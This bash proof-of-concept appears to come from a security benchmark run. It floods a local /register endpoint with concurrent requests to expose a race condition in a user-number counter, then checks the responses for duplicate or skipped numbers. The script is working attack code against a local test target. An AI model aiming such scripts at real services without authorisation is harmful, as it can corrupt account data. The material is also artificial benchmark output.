#!/bin/bash
# POC: Demonstrates race condition in user registration counter causing duplicate userNumber assignments
# Target: ./repo
# Created: 2025-12-01T16:20:29.181Z
# Session: benchmark-XBEN-099-24-minc74t1

# Race Condition in User Registration Counter POC
# This script demonstrates duplicate userNumber assignment through concurrent registrations
# Target: /register endpoint counter increment race condition

TARGET_URL="http://localhost:3000/register"
CONCURRENT_REQUESTS=15
RESULTS_FILE="/tmp/race_condition_results.txt"

# Clean up previous results
rm -f "$RESULTS_FILE"

echo "[*] Starting race condition test on $TARGET_URL"
echo "[*] Sending $CONCURRENT_REQUESTS concurrent registration requests..."

# Function to make a registration request and extract userNumber
register_user() {
    local request_num=$1
    local username="race_user_${request_num}_$$_$RANDOM"
    local password="testpass123"
    
    # Make request and capture the response
    response=$(curl -s -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&password=$password")
    
    # Extract userNumber from response (handles both JSON and HTML responses)
    # Try JSON format first
    usernumber=$(echo "$response" | grep -oP '"userNumber":\s*\K\d+' | head -1)
    
    # If not found, try HTML format
    if [ -z "$usernumber" ]; then
        usernumber=$(echo "$response" | grep -oP 'userNumber["\s:=]*["\s]*\K\d+' | head -1)
    fi
    
    # If still not found, try common response patterns
    if [ -z "$usernumber" ]; then
        usernumber=$(echo "$response" | grep -oP 'User[^{]*?\d+|userNumber.*?(\d+)' -o | grep -oP '\d+$' | tail -1)
    fi
    
    # Store results with detailed information
    if [ -n "$usernumber" ]; then
        echo "$usernumber:$username:$request_num" >> "$RESULTS_FILE"
        echo "[+] Request #$request_num -> userNumber: $usernumber (user: $username)"
    else
        echo "[-] Request #$request_num -> Failed to extract userNumber"
        echo "[DEBUG] Response: ${response:0:200}"
    fi
}

# Send concurrent requests
for i in $(seq 1 $CONCURRENT_REQUESTS); do
    register_user $i &
done

# Wait for all background processes to complete
wait

echo ""
echo "========================================="
echo "RACE CONDITION ANALYSIS RESULTS"
echo "========================================="

if [ ! -f "$RESULTS_FILE" ]; then
    echo "[-] No results collected. Requests may have failed."
    exit 1
fi

# Extract and sort userNumbers
echo "[*] Collected userNumbers:"
cat "$RESULTS_FILE" | cut -d':' -f1 | sort -n

echo ""
echo "[*] Analysis:"

# Check for duplicates
duplicates=$(cat "$RESULTS_FILE" | cut -d':' -f1 | sort | uniq -d)
if [ -n "$duplicates" ]; then
    echo "[!] DUPLICATE userNumbers DETECTED (Race Condition Evidence):"
    for dup in $duplicates; do
        count=$(cat "$RESULTS_FILE" | cut -d':' -f1 | grep "^$dup$" | wc -l)
        echo "    - userNumber $dup was assigned $count times:"
        cat "$RESULTS_FILE" | grep "^$dup:" | cut -d':' -f2 | sed 's/^/      * /'
    done
    echo ""
    echo "[✓] RACE CONDITION CONFIRMED: Duplicate userNumbers prove non-atomic counter increment"
else
    echo "[-] No duplicate userNumbers detected in this run"
    echo "    Note: Race conditions are timing-dependent and may not occur in every run"
fi

# Check for missing sequence numbers
echo ""
echo "[*] Checking for gaps in sequence (skipped userNumbers):"
all_nums=$(cat "$RESULTS_FILE" | cut -d':' -f1 | sort -n)
first=$(echo "$all_nums" | head -1)
last=$(echo "$all_nums" | tail -1)

missing_nums=""
for num in $(seq $first $last); do
    if ! echo "$all_nums" | grep -q "^$num$"; then
        missing_nums="$missing_nums $num"
    fi
done

if [ -n "$missing_nums" ]; then
    echo "[!] Missing userNumbers (skipped in sequence):$missing_nums"
    echo "[✓] Confirms race condition caused increments to be lost"
else
    echo "[-] No gaps detected in this run"
fi

# Summary statistics
echo ""
echo "[*] Statistics:"
total_requests=$(wc -l < "$RESULTS_FILE")
unique_nums=$(cat "$RESULTS_FILE" | cut -d':' -f1 | sort -u | wc -l)
duplicate_count=$((total_requests - unique_nums))

echo "    Total requests processed: $total_requests"
echo "    Unique userNumbers assigned: $unique_nums"
echo "    Duplicate assignments: $duplicate_count"

if [ $duplicate_count -gt 0 ] || [ -n "$missing_nums" ]; then
    echo ""
    echo "[✓] VULNERABILITY CONFIRMED: Race condition in userNumber counter"
    exit 0
else
    echo ""
    echo "[-] No race condition detected in this test run"
    echo "    (Timing-dependent; consider increasing CONCURRENT_REQUESTS or running multiple times)"
    exit 1
fi